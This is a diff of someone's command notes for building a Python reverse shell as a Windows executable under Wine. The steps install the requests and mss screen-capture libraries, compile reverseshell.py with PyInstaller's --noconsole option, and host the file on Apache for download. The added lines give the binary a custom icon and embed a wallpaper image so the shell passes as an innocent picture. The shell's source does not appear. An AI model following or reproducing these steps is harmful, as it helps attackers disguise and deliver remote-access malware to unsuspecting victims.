@@ -18,7 +18,7 @@ wine /home/esmith/.wine/drive_c/python27/python.exe -m pip install requests
 wine /home/esmith/.wine/drive_c/python27/python.exe -m pip install mss
 
 # Convert Python to .exe
-wine /home/esmith/.wine/drive_c/Python27/Scripts/easy_install-2.7.exe --onefile --noconsole rs.py
+wine /home/esmith/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole rs.py
 
 ls
 
@@ -28,3 +28,11 @@ mv python.exe /var/www//html
 sudo service apache2 start
 # Delete index.html if required
 # Hit URL
+
+# Change icon in compile
+Download ico from web
+wine /home/esmith/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon /path/to/my.ico reverseshell.py
+
+# Embed to wallpaper
+Download wallpaper
+wine /home/esmith/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/path/to/wallpaper.jpg;." --onefile --noconsole --icon /path/to/my.ico reverseshell.py
